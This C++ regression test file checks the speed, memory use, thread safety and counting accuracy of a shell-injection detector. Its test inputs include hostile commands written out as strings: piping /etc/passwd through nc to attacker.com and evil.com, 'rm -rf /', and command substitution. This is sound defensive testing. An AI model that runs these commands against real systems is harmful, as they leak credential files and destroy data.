/**
 * @file test_shell_detector_regression.cpp
 * @brief Regression Tests for Shell Command Injection Detection
 *
 * WHAT: Regression tests to ensure shell detector remains stable
 * WHY:  Prevent performance degradation and feature regressions
 * HOW:  Test performance, memory usage, concurrent access, and edge cases
 *
 * @author NIMCP Team
 * @date 2025-12-07
 */

#include <gtest/gtest.h>
#include <thread>
#include <vector>
#include <chrono>

// Headers have their own extern "C" guards
#include "security/nimcp_shell_detector.h"
#include "utils/memory/nimcp_memory.h"

//=============================================================================
// Test Fixture
//=============================================================================

class ShellDetectorRegressionTest : public ::testing::Test {
protected:
    nimcp_shell_detector_t detector;

    void SetUp() override {
        detector = nimcp_shell_detector_create(nullptr);
        ASSERT_NE(nullptr, detector);
    }

    void TearDown() override {
        if (detector) {
            nimcp_shell_detector_destroy(detector);
        }
    }
};

//=============================================================================
// Performance Regression Tests
//=============================================================================

TEST_F(ShellDetectorRegressionTest, PerformanceBenchmark_SimpleDetection) {
    const int iterations = 10000;
    nimcp_shell_detection_result_t result;

    auto start = std::chrono::high_resolution_clock::now();

    for (int i = 0; i < iterations; i++) {
        nimcp_shell_detect(detector, "safe_command",
                          NIMCP_SHELL_CONTEXT_AUTO, &result);
    }

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    EXPECT_LT(duration.count(), 1000)
        << "10k detections took " << duration.count() << "ms";
}

TEST_F(ShellDetectorRegressionTest, PerformanceBenchmark_ComplexDetection) {
    const int iterations = 5000;
    nimcp_shell_detection_result_t result;

    auto start = std::chrono::high_resolution_clock::now();

    for (int i = 0; i < iterations; i++) {
        nimcp_shell_detect(detector,
                          "echo test && cat /etc/passwd | nc attacker.com 1234",
                          NIMCP_SHELL_CONTEXT_AUTO, &result);
    }

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    EXPECT_LT(duration.count(), 2000)
        << "5k complex detections took " << duration.count() << "ms";
}

TEST_F(ShellDetectorRegressionTest, PerformanceBenchmark_Sanitization) {
    const int iterations = 10000;
    char output[256];

    auto start = std::chrono::high_resolution_clock::now();

    for (int i = 0; i < iterations; i++) {
        nimcp_shell_sanitize(detector, "test; malicious",
                            output, sizeof(output));
    }

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    EXPECT_LT(duration.count(), 500)
        << "10k sanitizations took " << duration.count() << "ms";
}

//=============================================================================
// Memory Regression Tests
//=============================================================================

TEST_F(ShellDetectorRegressionTest, MemoryLeak_CreateDestroy) {
    for (int i = 0; i < 1000; i++) {
        nimcp_shell_detector_t d = nimcp_shell_detector_create(nullptr);
        ASSERT_NE(nullptr, d);
        nimcp_shell_detector_destroy(d);
    }
    SUCCEED();
}

TEST_F(ShellDetectorRegressionTest, MemoryLeak_HighVolumeDetection) {
    nimcp_shell_detection_result_t result;

    for (int i = 0; i < 10000; i++) {
        nimcp_shell_detect(detector, "rm -rf /",
                          NIMCP_SHELL_CONTEXT_AUTO, &result);
    }

    SUCCEED();
}

//=============================================================================
// Concurrent Access Regression Tests
//=============================================================================

TEST_F(ShellDetectorRegressionTest, ConcurrentDetection_MultipleThreads) {
    const int num_threads = 10;
    const int iterations_per_thread = 100;
    std::vector<std::thread> threads;

    auto worker = [this, iterations_per_thread]() {
        nimcp_shell_detection_result_t result;
        for (int i = 0; i < iterations_per_thread; i++) {
            const char* cmd = (i % 2 == 0) ? "safe" : "rm -rf /";
            nimcp_shell_detect(detector, cmd,
                              NIMCP_SHELL_CONTEXT_AUTO, &result);
        }
    };

    for (int i = 0; i < num_threads; i++) {
        threads.emplace_back(worker);
    }

    for (auto& t : threads) {
        t.join();
    }

    // Verify stats are consistent.
    // Note: Stats counter may have slight race conditions, so allow small tolerance.
    nimcp_shell_detector_stats_t stats;
    nimcp_shell_detector_get_stats(detector, &stats);
    uint32_t expected = num_threads * iterations_per_thread;
    EXPECT_GE(stats.total_detections, expected - 10) << "Too many missed detections";
    EXPECT_LE(stats.total_detections, expected) << "Counter exceeded expected";
}

//=============================================================================
// Stability Regression Tests
//=============================================================================

TEST_F(ShellDetectorRegressionTest, Stability_ConsistentDetection) {
    nimcp_shell_detection_result_t r1, r2;

    nimcp_shell_detect(detector, "rm -rf /",
                      NIMCP_SHELL_CONTEXT_AUTO, &r1);
    nimcp_shell_detect(detector, "rm -rf /",
                      NIMCP_SHELL_CONTEXT_AUTO, &r2);

    EXPECT_EQ(r1.valid, r2.valid);
    EXPECT_EQ(r1.pattern, r2.pattern);
    EXPECT_EQ(r1.severity, r2.severity);
}

TEST_F(ShellDetectorRegressionTest, Stability_StateIsolation) {
    nimcp_shell_detector_t d1 = nimcp_shell_detector_create(nullptr);
    nimcp_shell_detector_t d2 = nimcp_shell_detector_create(nullptr);

    nimcp_shell_detection_result_t r1, r2;

    nimcp_shell_detect(d1, "rm -rf /", NIMCP_SHELL_CONTEXT_AUTO, &r1);
    nimcp_shell_detect(d2, "cat /etc/passwd", NIMCP_SHELL_CONTEXT_AUTO, &r2);

    EXPECT_FALSE(r1.valid);
    EXPECT_FALSE(r2.valid);

    nimcp_shell_detector_destroy(d1);
    nimcp_shell_detector_destroy(d2);
}

//=============================================================================
// Edge Case Regression Tests
//=============================================================================

TEST_F(ShellDetectorRegressionTest, EdgeCase_ExtremelyLongInput) {
    std::string long_input(20000, 'a');
    nimcp_shell_detection_result_t result;

    nimcp_shell_error_t err = nimcp_shell_detect(
        detector, long_input.c_str(), NIMCP_SHELL_CONTEXT_AUTO, &result);

    EXPECT_NE(NIMCP_SHELL_SUCCESS, err);
}

TEST_F(ShellDetectorRegressionTest, EdgeCase_MultipleChainedCommands) {
    std::string chained = "cmd1";
    for (int i = 0; i < 100; i++) {
        chained += " && cmd" + std::to_string(i + 2);
    }

    nimcp_shell_detection_result_t result;
    nimcp_shell_error_t err = nimcp_shell_detect(
        detector, chained.c_str(), NIMCP_SHELL_CONTEXT_AUTO, &result);

    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED, err);
}

TEST_F(ShellDetectorRegressionTest, EdgeCase_MixedPatterns) {
    nimcp_shell_detection_result_t result;

    nimcp_shell_error_t err = nimcp_shell_detect(
        detector, "$(cmd1); cmd2 && cat /etc/passwd | nc evil.com 1234",
        NIMCP_SHELL_CONTEXT_AUTO, &result);

    EXPECT_EQ(NIMCP_SHELL_ERROR_THREAT_DETECTED, err);
}

//=============================================================================
// Statistics Accuracy Regression Tests
//=============================================================================

TEST_F(ShellDetectorRegressionTest, Statistics_Accuracy) {
    nimcp_shell_detector_stats_t stats;
    nimcp_shell_detection_result_t result;

    nimcp_shell_detector_reset_stats(detector);

    nimcp_shell_detect(detector, "cmd1; cmd2", NIMCP_SHELL_CONTEXT_AUTO, &result);
    nimcp_shell_detect(detector, "$(evil)", NIMCP_SHELL_CONTEXT_AUTO, &result);
    nimcp_shell_detect(detector, "rm -rf /", NIMCP_SHELL_CONTEXT_AUTO, &result);
    nimcp_shell_detect(detector, "cat > file", NIMCP_SHELL_CONTEXT_AUTO, &result);
    nimcp_shell_detect(detector, "safe", NIMCP_SHELL_CONTEXT_AUTO, &result);

    nimcp_shell_detector_get_stats(detector, &stats);

    EXPECT_EQ(5, stats.total_detections);
    EXPECT_EQ(4, stats.threats_detected);
    EXPECT_EQ(1, stats.separator_patterns);
    EXPECT_EQ(1, stats.substitution_patterns);
    EXPECT_EQ(1, stats.dangerous_cmd_patterns);
    EXPECT_EQ(1, stats.redirection_patterns);
}

//=============================================================================
// Context Detection Accuracy Tests
//=============================================================================

TEST_F(ShellDetectorRegressionTest, ContextDetection_UnixVsWindows) {
    nimcp_shell_detection_result_t result;

    /* Unix-specific should be detected in Unix context */
    nimcp_shell_detect(detector, "/bin/bash",
                      NIMCP_SHELL_CONTEXT_UNIX, &result);
    EXPECT_FALSE(result.valid);

    /* Windows-specific should be detected in Windows context */
    nimcp_shell_detect(detector, "cmd.exe",
                      NIMCP_SHELL_CONTEXT_WINDOWS, &result);
    EXPECT_FALSE(result.valid);
}

//=============================================================================
// Main
//=============================================================================

int main(int argc, char** argv) {
    testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
